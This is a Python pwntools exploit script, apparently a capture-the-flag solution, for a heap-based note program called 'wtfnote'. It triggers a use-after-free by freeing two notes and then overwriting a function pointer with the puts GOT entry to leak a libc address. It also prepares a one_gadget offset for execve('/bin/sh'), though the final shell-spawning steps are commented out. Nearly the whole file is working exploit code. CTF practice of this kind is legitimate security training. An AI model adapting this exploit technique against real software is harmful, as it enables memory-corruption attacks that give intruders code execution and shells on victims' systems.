#!/usr/bin/env python2
import sys, time

from pwn import *

file = './wtfnote'
server, port = '127.0.0.1'  , 10135 
# server, port = 'csie.ctf.tw', 10135 

r, context.binary = remote(server, port), file
# ========================================================================
file, libc = ELF( file ), ELF("libc-2.23.so")

# $> one_gadget libc-2.27.so
# Get: 0x45216	execve("/bin/sh", rsp+0x30, environ), constraints: rax == NULL
libc_one_gadget = 0x045216
# $> ROPgadget --binary libc-2.23.so | grep 'xor rax, rax'
# Get: 0x000000000008ad15 : xor rax, rax ; ret
libc_pop_rcx    = 0x08ad15

r.recvuntil("Welcome to WTF Note!",                     drop=True)
r.recvuntil("It was at this moment that you realized,", drop=True)
r.recvuntil("you are playing WTF rather than CTF...",   drop=True)
# 1. new note
# 2. print note
# 3. delete note
# 4. exit

def new_note(size, content):
    r.sendlineafter("choice> " , "1"       )
    r.sendlineafter("size: "   , str(size) )
    r.sendlineafter("content: ", content   )
def print_note(index):
    r.sendlineafter("choice> " , "2"       )
    r.sendlineafter("index: "  , str(index))
def delete_note(index):
    r.sendlineafter("choice> " , "3"       )
    r.sendlineafter("index: "  , str(index))

new_note(0x50, "AAAAAAAA")
new_note(0x50, "AAAAAAAA")
delete_note(0)
delete_note(1)

raw_input("@@@")

new_note(0x10, p64(file.symbols['print_note']) + p64(file.got['puts']))
print_note(0)
tmp = r.recvline()
addr = u64(tmp[:-1].ljust(8,"\x00"))
print hex(addr)
# base = addr - 0x6f690
# one_gadget = base + 0xf0274
# delete_note(2)
# new_note(16, p64(one_gadget))
# print_note(0)

# r.interactive()
